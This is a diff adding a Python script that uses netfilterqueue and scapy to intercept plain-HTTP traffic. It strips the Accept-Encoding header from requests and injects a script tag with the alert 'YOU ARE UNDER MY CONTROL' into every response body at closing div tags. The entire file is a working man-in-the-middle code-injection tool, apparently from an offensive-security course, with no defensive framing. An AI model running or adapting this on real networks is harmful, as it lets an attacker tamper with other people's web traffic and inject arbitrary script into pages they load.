@@ -1,0 +1,32 @@
+#! /usr/bin/ env python
+import netfilterqueue
+import scapy.all as scapy
+import re
+
+def set_load(packet, load):
+    packet[scapy.Raw].load = load
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksum
+    del packet[scapy.TCP].chksum
+    return packet
+
+def process_packet(packet):
+    scapy_pack = scapy.IP(packet.get_payload())
+    if scapy_pack.haslayer(scapy.Raw):
+        load = scapy_pack[scapy.Raw].load
+        if scapy_pack[scapy.TCP].dport == 80:
+            print("--- Request ---------")
+            modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
+            new_packet = set_load(scapy_pack, modified_load)
+            packet.set_payload(str(new_packet))
+        elif scapy_pack[scapy.TCP].sport == 80:
+            print("--HTTP RESPONSE--")
+            modified_load = load.replace("</div>", "<script>alert('YOU ARE UNDER MY CONTROL');</script></div>")
+            new_packet = set_load(scapy_pack, modified_load)
+            packet.set_payload(str(new_packet))
+            print(scapy_pack.show())
+    packet.accept()
+
+queue = netfilterqueue.NetfilterQueue()
+queue.bind(1, process_packet)
+queue.run()
